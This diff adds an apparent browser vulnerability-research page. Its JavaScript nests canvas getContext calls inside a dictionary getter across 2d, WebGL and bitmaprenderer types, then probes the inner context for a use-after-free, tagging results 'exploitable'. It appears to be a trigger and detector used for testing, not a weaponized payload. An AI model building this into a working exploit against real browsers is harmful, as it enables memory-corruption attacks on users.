@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html><head>
+<meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V557 Combined Cross-Type Context Tests</title>
+<style>body{background:#111;color:#0f0;font:12px/1.4 monospace;margin:8px}
+.pass{color:#0f0}.fail{color:#f44}.info{color:#ff0}.warn{color:#f80}
+pre{white-space:pre-wrap;word-break:break-all}</style>
+</head><body>
+<pre id="log"></pre>
+<script>
+var L = document.getElementById('log');
+function log(msg, cls) {
+  var s = document.createElement('span');
+  s.className = cls || '';
+  s.textContent = msg + '\n';
+  L.appendChild(s);
+}
+
+function testCrossType(name, outerType, innerType) {
+  log('--- ' + name + ' ---', 'info');
+  try {
+    var canvas = document.createElement('canvas');
+    canvas.width = 50; canvas.height = 50;
+    document.body.appendChild(canvas);
+
+    var capturedInner = null;
+    var getterCalled = false;
+    var phase = 'initial';
+
+    var dict = {};
+    Object.defineProperty(dict, 'alpha', {
+      get: function() {
+        if (phase === 'trigger' && !getterCalled) {
+          getterCalled = true;
+          log('  [GETTER] alpha getter fired during ' + outerType + ' dict conversion', 'info');
+          capturedInner = canvas.getContext(innerType);
+          log('  [GETTER] inner getContext("' + innerType + '") = ' + capturedInner);
+        }
+        return true;
+      }
+    });
+
+    phase = 'trigger';
+    log('  [MAIN] getContext("' + outerType + '", dict)...', 'info');
+    var outerCtx = canvas.getContext(outerType, dict);
+
+    if (!getterCalled) {
+      log('  [SKIP] Getter was NOT called — dict conversion may not read alpha for ' + outerType, 'warn');
+      canvas.remove();
+      return 'SKIP';
+    }
+
+    if (!capturedInner) {
+      log('  [INFO] Inner context was null — ' + innerType + ' may be disabled', 'warn');
+      canvas.remove();
+      return 'NULL';
+    }
+
+    log('  [CHECK] outerCtx = ' + outerCtx);
+    log('  [CHECK] capturedInner = ' + capturedInner);
+    log('  [CHECK] same? ' + (outerCtx === capturedInner));
+
+    // If outer succeeded and inner was captured, and they're different objects,
+    // the inner context's C++ backing was freed when m_context was overwritten
+
+    if (outerCtx && capturedInner && outerCtx !== capturedInner) {
+      log('  [!!!] DIFFERENT objects — inner context may be FREED', 'fail');
+
+      // Probe the inner (potentially freed) context
+      try {
+        if (innerType === '2d') {
+          var lw = capturedInner.lineWidth;
+          log('  [PROBE] lineWidth = ' + lw + ' (expect 1 if alive, garbage if freed)', lw === 1 ? 'pass' : 'fail');
+        } else if (innerType === 'webgl') {
+          var dw = capturedInner.drawingBufferWidth;
+          log('  [PROBE] drawingBufferWidth = ' + dw, 'info');
+        } else if (innerType === 'bitmaprenderer') {
+          log('  [PROBE] bitmaprenderer captured — testing transferFromImageBitmap', 'info');
+          try {
+            capturedInner.transferFromImageBitmap(null);
+            log('  [PROBE] transferFromImageBitmap(null) succeeded', 'pass');
+          } catch(e) {
+            log('  [PROBE] transferFromImageBitmap threw: ' + e.message, 'info');
+          }
+        }
+      } catch(e) {
+        log('  [PROBE] Access threw: ' + e.name + ': ' + e.message, 'fail');
+      }
+
+      canvas.remove();
+      return 'UAF_CANDIDATE';
+    }
+
+    if (outerCtx === capturedInner) {
+      log('  [INFO] Same object returned — no overwrite occurred', 'pass');
+      canvas.remove();
+      return 'SAME';
+    }
+
+    if (!outerCtx && capturedInner) {
+      log('  [INFO] Outer returned null but inner captured — m_context was set then outer failed', 'info');
+      // This means createContextXxx returned null but still overwrote m_context!
+      // Actually: if m_context was assigned nullptr, the inner context IS freed
+      log('  [!!!] m_context overwritten with null — inner context FREED', 'fail');
+      canvas.remove();
+      return 'UAF_NULL_OVERWRITE';
+    }
+
+    canvas.remove();
+    return 'UNKNOWN';
+
+  } catch(e) {
+    log('  [CRASH?] ' + e.name + ': ' + e.message, 'fail');
+    return 'EXCEPTION';
+  }
+}
+
+log('V557 COMBINED: Cross-Type getContext Reentrancy Tests', 'info');
+log('=====================================================', 'info');
+log('Platform: ' + navigator.userAgent, 'info');
+log('');
+
+var results = {};
+
+// T1: WebGL dict → creates 2d → WebGL overwrites
+results.T1 = testCrossType('T1: webgl→2d', 'webgl', '2d');
+log('');
+
+// T2: 2d dict → creates WebGL → 2d overwrites
+results.T2 = testCrossType('T2: 2d→webgl', '2d', 'webgl');
+log('');
+
+// T3: bitmaprenderer dict → creates 2d → bitmaprenderer overwrites
+results.T3 = testCrossType('T3: bitmaprenderer→2d', 'bitmaprenderer', '2d');
+log('');
+
+// T4: 2d dict → creates bitmaprenderer → 2d overwrites
+results.T4 = testCrossType('T4: 2d→bitmaprenderer', '2d', 'bitmaprenderer');
+log('');
+
+// T5: webgl dict → creates bitmaprenderer → webgl overwrites
+results.T5 = testCrossType('T5: webgl→bitmaprenderer', 'webgl', 'bitmaprenderer');
+log('');
+
+// T6: bitmaprenderer dict → creates WebGL → bitmaprenderer overwrites
+results.T6 = testCrossType('T6: bitmaprenderer→webgl', 'bitmaprenderer', 'webgl');
+log('');
+
+// T7: Same-type 2d→2d (original CVE-2026-43720 pattern for comparison)
+results.T7 = testCrossType('T7: 2d→2d (same-type reference)', '2d', '2d');
+log('');
+
+log('=== RESULTS SUMMARY ===', 'info');
+for (var k in results) {
+  var r = results[k];
+  var cls = r.indexOf('UAF') >= 0 ? 'fail' : (r === 'SAME' || r === 'SKIP' ? 'pass' : 'warn');
+  log(k + ': ' + r, cls);
+}
+
+log('');
+log('UAF_CANDIDATE = inner context freed, JS wrapper survives (exploitable)', 'fail');
+log('UAF_NULL_OVERWRITE = outer returned null but inner freed (exploitable)', 'fail');
+log('SAME = same context returned, no overwrite (safe)', 'pass');
+log('SKIP = dict getter not called (type may not use dict)', 'warn');
+log('NULL = inner context unavailable (disabled)', 'warn');
+</script>
+</body>
+</html>
